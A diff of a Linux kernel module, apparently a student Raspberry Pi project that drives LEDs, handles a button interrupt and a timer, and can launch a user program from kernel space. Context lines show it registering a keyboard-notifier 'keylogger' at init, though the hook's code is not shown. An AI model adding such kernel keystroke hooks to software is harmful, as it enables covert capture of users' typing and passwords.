@@ -27,7 +27,7 @@ TODO
 #include <linux/types.h>
 #include <linux/timer.h>       /* Needed for timer */
 #include <linux/gpio.h>       // Required for the GPIO functions
-#include <asm/unistd.h>
+#include <linux/interrupt.h> // for irq
 
 
 
@@ -56,23 +56,10 @@ static bool ledOn6 = 0;
 static unsigned int gpioLED13 = 13;
 static bool ledOn13 = 0;
 
-static unsigned int gpioButton = 115;   ///< hard coding the button gpio for this example to P9_27 (GPIO115)
+static unsigned int gpioButton = 16;   ///< hard coding the button gpio for this example to P9_27 (GPIO115)
 static unsigned int irqNumber;
 static unsigned int numberPresses = 0;  //for information, store the number of Button presses
 
-/*
-*
-* irq setup for Button
-*
-*/
-
-static irq_handler_t irq_handler(unsigned int irq, void *dev_id, struct pt_regs *regs){
-
-	 to_show_cpu = !to_show_cpu;           //switching between cpu and memory display of the led
-	 printk(KERN_INFO "GPIO_TEST: Interrupt! (button state is %d)\n", gpio_get_value(gpioButton));
-   numberPresses++;                         // Global counter, will be outputted when the module is unloaded
-   return (irq_handler_t) IRQ_HANDLED;      // Announce that the IRQ has been handled correctly
-}
 /*
 * timer setup
 */
@@ -92,6 +79,21 @@ static int to_run = 0;
 static bool to_show_cpu = 0;
 static int precent = 0;
 
+
+/*
+*
+* irq setup for Button
+*
+*/
+
+static irq_handler_t irq_handler(unsigned int irq, void *dev_id, struct pt_regs *regs){
+
+	 to_show_cpu = !to_show_cpu;           //switching between cpu and memory display of the led
+	 printk(KERN_INFO "GPIO_TEST: Interrupt! (button state is %d)\n", gpio_get_value(gpioButton));
+     numberPresses++;                         // Global counter, will be outputted when the module is unloaded
+   return (irq_handler_t) IRQ_HANDLED;      // Announce that the IRQ has been handled correctly
+}
+
 /*
 * running user application from kernel space
 * this should be calld from button press for now on init
@@ -100,10 +102,11 @@ static int precent = 0;
 static int run_user_app(void)
 {
   //struct subprocess_info *sub_info;
-	///home/saw/Desktop/os2/project
+	// /home/saw/Desktop/os2/project
   //  /home/saw/Desktop/AdvanceOS/lkp/project/a.out
 	// /home/pi/Desktop/project/a.out
-	char *argv[] = {"/home/saw/Desktop/project/a.out", NULL};
+	// /home/pi/Desktop/project
+	char *argv[] = {"/home/pi/Desktop/project/a.out", NULL};
   static char *envp[] = {"HOME=/","TERM=linux","PATH=/sbin:/bin:/usr/sbin:/usr/bin",NULL};
 
   //sub_info = call_usermodehelper_setup(argv[0],argv,envp,GFP_ATOMIC,NULL,NULL,NULL);
@@ -390,6 +393,7 @@ static int __init init_sys_status(void)
 {
   int err = -1;
   int run = 42;
+  int result =42;
   //keybot notifier init
   register_keyboard_notifier(&keylogger_nb);
   printk(KERN_INFO "sys status module: Registering the keylogger module with the keyboard notifier list\n");
@@ -453,9 +457,9 @@ static int __init init_sys_status(void)
   my_set_timer(&myTimer);
   printk (KERN_INFO "sys status module:timer added. \n");
 
-  printk(KERN_INFO "sys status module: Running run_user_app!!");
-  run =  run_user_app();
-  printk(KERN_INFO "sys status module: run user app return: %d",run);
+  //printk(KERN_INFO "sys status module: Running run_user_app!!");
+  //run =  run_user_app();
+  //printk(KERN_INFO "sys status module: run user app return: %d",run);
 
 
   printk(KERN_INFO "sys_status_module: init finished");
